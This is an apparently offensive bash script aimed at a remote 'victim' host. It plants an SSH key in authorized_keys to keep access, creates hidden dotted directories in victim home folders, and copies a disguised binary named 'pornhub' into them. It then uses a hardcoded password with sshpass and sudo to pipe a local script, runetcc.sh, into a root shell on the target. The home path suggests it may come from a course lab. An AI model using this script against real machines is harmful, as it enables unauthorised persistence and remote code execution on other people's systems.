#!/bin/bash
read -p "Enter the remote host ip: " remotehost
echo ""
read -p "Enter remote host username: " user
echo ""
echo "Generating key for ${HOSTNAME}"
echo "========================================="
sleep 1
ssh-keygen
echo ""
echo "Copying key to ${remotehost}"
sleep 1
ssh-copy-id -i ~/.ssh/id_rsa.pub ${user}@${remotehost}
sleep 1

cat ~/.ssh/id_rsa.pub | ssh ${user}@${remotehost} "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

ssh ${user}@${remotehost} "mkdir -p /home/victim/.david/.module"
ssh ${user}@${remotehost} "mkdir -p /home/victim/.steven/.module"

scp pornhub ${user}@${remotehost}:/home/victim/.david/.module
scp pornhub ${user}@${remotehost}:/home/victim/.steven/.module

sshpass -p 'victim' ssh ${user}@${remotehost} 'echo "victim" | sudo -Sv && bash -s' < /home/cs2019/Desktop/runetcc.sh


